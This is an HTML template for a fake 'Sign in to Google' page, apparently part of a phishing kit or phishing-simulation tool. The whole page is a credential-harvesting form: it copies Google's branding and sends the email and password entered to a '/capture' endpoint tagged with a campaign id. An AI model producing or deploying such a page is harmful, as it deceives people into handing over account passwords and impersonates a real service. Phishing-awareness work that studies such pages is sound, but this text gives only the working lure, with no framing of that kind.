<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Google</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: #fff; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 400px; padding: 40px; }
        .logo { text-align: center; margin-bottom: 30px; color: #4285f4; font-size: 28px; font-weight: bold; }
        h1 { font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 10px; color: #1a1a2e; }
        .subtitle { font-size: 14px; text-align: center; color: #666; margin-bottom: 30px; }
        .input-group { margin-bottom: 20px; }
        input { width: 100%; padding: 14px; font-size: 15px; border: 2px solid #e0e0e0; border-radius: 8px; outline: none; transition: border-color 0.3s; }
        input:focus { border-color: #4285f4; }
        button { width: 100%; background: #4285f4; color: #fff; border: none; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; transition: opacity 0.3s; }
        button:hover { opacity: 0.9; }
        .links { text-align: center; margin-top: 25px; font-size: 14px; }
        .links a { color: #4285f4; text-decoration: none; }
        .divider { display: flex; align-items: center; margin: 25px 0; }
        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #e0e0e0; }
        .divider span { padding: 0 15px; color: #999; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Google</div>
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Google</p>
        <form method="POST" action="/capture?c={campaign_id}">
            <div class="input-group"><input type="email" name="email" placeholder="Email address" required></div>
            <div class="input-group"><input type="password" name="password" placeholder="Password" required></div>
            <button type="submit">Sign In</button>
        </form>
        <div class="links">
            <a href="#">Forgot password?</a> • <a href="#">Create account</a>
        </div>
    </div>
</body>
</html>
